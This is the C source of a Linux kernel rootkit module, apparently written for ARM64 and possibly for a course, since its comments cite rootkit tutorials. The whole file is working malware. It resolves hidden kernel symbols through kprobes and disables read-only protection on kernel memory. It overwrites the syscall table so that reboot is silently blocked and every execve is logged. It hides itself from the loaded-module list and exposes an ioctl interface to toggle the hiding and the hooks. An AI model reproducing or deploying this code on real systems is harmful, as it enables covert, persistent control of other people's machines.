#include <linux/module.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <asm/syscall.h>

#include "rootkit.h"

static int major;
struct cdev *kernel_cdev;

/****** hide unhide ******/
static bool hidden;
static struct list_head *prev_module;
struct mutex hide_mutex;

/****** hook ******/
static bool hooked;
struct mutex hook_mutex;
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kk_lookup_name;
unsigned long *sys_call_table_;
#define __NR_reboot 142
#define __NR_execve 221
static asmlinkage long (*orig_reboot)(const struct pt_regs *);
static asmlinkage long (*orig_execve)(const struct pt_regs *);
static void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt,
					phys_addr_t size, pgprot_t prot);

/**
 * Function Prototypes
*/
static int __init rootkit_init(void);
static void __exit rootkit_exit(void);

/******************* rootkit function **********************/
static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg);
static int rootkit_open(struct inode *inode, struct file *filp);
static int rootkit_release(struct inode *inode, struct file *filp);

/******************* hide/unhide function ******************/
static void hide_rootkit(void);
static void unhide_rootkit(void);

/******************* hook syscall ******************/
static int rootkit_hook(void);
static int rootkit_unhook(void);
static asmlinkage long reboot_hook(const struct pt_regs *);
static asmlinkage long execve_hook(const struct pt_regs *);
static void write_protection_enable(void);
static void write_protection_disable(void);

const struct file_operations fops = {
    	open:rootkit_open,
    	unlocked_ioctl:rootkit_ioctl,
    	release:rootkit_release,
    	owner:THIS_MODULE
};

static void hide_rootkit(void)
{	
	mutex_lock(&hide_mutex);

    	pr_info("rootkit: hiding rootkit!\n");
    	if (THIS_MODULE->list.prev != NULL){
        	prev_module = THIS_MODULE->list.prev;
        	list_del(&THIS_MODULE->list);
    	}
    	hidden = true;

	mutex_unlock(&hide_mutex);
}

static void unhide_rootkit(void)
{
	mutex_lock(&hide_mutex);

	pr_info("rootkit: revealing rootkit!\n");
    	if (prev_module != NULL) {
        	list_add(&THIS_MODULE->list, prev_module);
    	}
    	hidden = false;

	mutex_unlock(&hide_mutex);
}

/**
 * ref: https://github.com/LTD-Beget/tcpsecrets/blob/master/tcpsecrets.c
 * ref: https://xcellerator.github.io/posts/linux_rootkits_11/
*/
static unsigned long kprobe_lookup_symbol(const char *name)
{

	kk_lookup_name = NULL;
	int ret = 0;

	if (!kk_lookup_name) {
		ret = register_kprobe(&kp);
		if(ret < 0){
			pr_info("rootkit: fail to kprobe.\n");
		}
		kk_lookup_name = (kallsyms_lookup_name_t) kp.addr;
		unregister_kprobe(&kp);
	}
	return kk_lookup_name(name);
}

static asmlinkage long reboot_hook(const struct pt_regs *regs)
{
	return 0;
}

/**
 * ref: https://xcellerator.github.io/posts/linux_rootkits_02/
*/
asmlinkage long execve_hook(const struct pt_regs *regs)
{
	char __user *pathname_u = (char *)regs->regs[0];
	char pathname[NAME_MAX] = {0};

	strncpy_from_user(pathname, pathname_u, NAME_MAX);

	/* print out the pathname before calling system call */
	pr_info("exec %s\n", pathname);
	return orig_execve(regs);
}

/**
 * ref: https://blog.csdn.net/weixin_42915431/article/details/115289115
*/
static void write_protection_disable()
{
	unsigned long start_rodata, init_begin, section_size;

	update_mapping_prot = 
		(void*)kprobe_lookup_symbol("update_mapping_prot");
	start_rodata =
		(unsigned long)kk_lookup_name("__start_rodata");
	init_begin =
		(unsigned long)kk_lookup_name("__init_begin");

	section_size = init_begin - start_rodata;
	update_mapping_prot(__pa_symbol(start_rodata), start_rodata,
			    section_size, PAGE_KERNEL);
}

/**
 * ref: https://blog.csdn.net/weixin_42915431/article/details/115289115
*/
static void write_protection_enable()
{
	unsigned long start_rodata, init_begin, section_size;

	update_mapping_prot = 
		(void*)kk_lookup_name("update_mapping_prot");
	start_rodata =
		(unsigned long)kk_lookup_name("__start_rodata");
	init_begin =
		(unsigned long)kk_lookup_name("__init_begin");

	section_size = init_begin - start_rodata;
	update_mapping_prot(__pa_symbol(start_rodata), start_rodata,
			    section_size, PAGE_KERNEL_RO);
}

/**
 * ref: https://blog.csdn.net/weixin_42915431/article/details/115289115
*/
static int rootkit_hook(void)
{	
	mutex_lock(&hook_mutex);

	if(!hooked) {
		pr_info("rootkit: Start hooking syscalls.\n");
		sys_call_table_ = 
			(unsigned long *)kprobe_lookup_symbol("sys_call_table");
		//preempt_disable();
		write_protection_disable();

		orig_reboot = (void *)sys_call_table_[__NR_reboot];
		orig_execve = (void *)sys_call_table_[__NR_execve];

		sys_call_table_[__NR_reboot] = (long)reboot_hook;
		sys_call_table_[__NR_execve] = (long)execve_hook;

		write_protection_enable();
		//preempt_enable();
		hooked = true;
		pr_info("rootkit: Hook sucessfully.\n");
	} else {
		pr_info("rootkit: Already hooked syscalls.\n");
	}

	mutex_unlock(&hook_mutex);
	return 0;
}

static int rootkit_unhook(void)
{
	mutex_lock(&hook_mutex);

	if(hooked) {
		preempt_disable();
		write_protection_disable();

		sys_call_table_[__NR_reboot] = (unsigned long)orig_reboot;
		sys_call_table_[__NR_execve] = (unsigned long)orig_execve;
		
		write_protection_enable();
		preempt_enable();
		hooked = false;
	} else {
		pr_info("rootkit: Not hooked syscalls yet.\n");
	}

	mutex_unlock(&hook_mutex);
	return 0;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
	unsigned long arg)
{
	long ret = 0;

	pr_info("rootkit: %s\n", __func__);

	switch (ioctl) {
	case IOCTL_MOD_HOOK:
		ret = rootkit_hook();
		break;
	case IOCTL_MOD_HIDE:
        if(hidden)
            unhide_rootkit();
        else
            hide_rootkit();
		break;
	default:
		ret = -EINVAL;
	}

	return ret;
}

static int rootkit_open(struct inode *inode, struct file *filp)
{
	pr_info("rootkit: %s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	pr_info("rootkit: %s\n", __func__);
	return 0;
}

/*
 * ref: https://linux-kernel-labs.github.io/refs/heads/master/labs/device_drivers.html
 */
static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

    	/* Initialize variables */
    	hidden = false;
	hooked = false;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("rootkit: major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	pr_info("rootkit: The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info("rootkit: unable to allocate cdev");
		return ret;
	}

	mutex_init(&hide_mutex);
	mutex_init(&hook_mutex);

	return 0;
}

static void __exit rootkit_exit(void)
{
	mutex_destroy(&hide_mutex);
	mutex_destroy(&hook_mutex);
	rootkit_unhook();
	pr_info("rootkit: removed\n");
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_AUTHOR("JACKERYLI");
MODULE_DESCRIPTION("JACKERYLI");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");
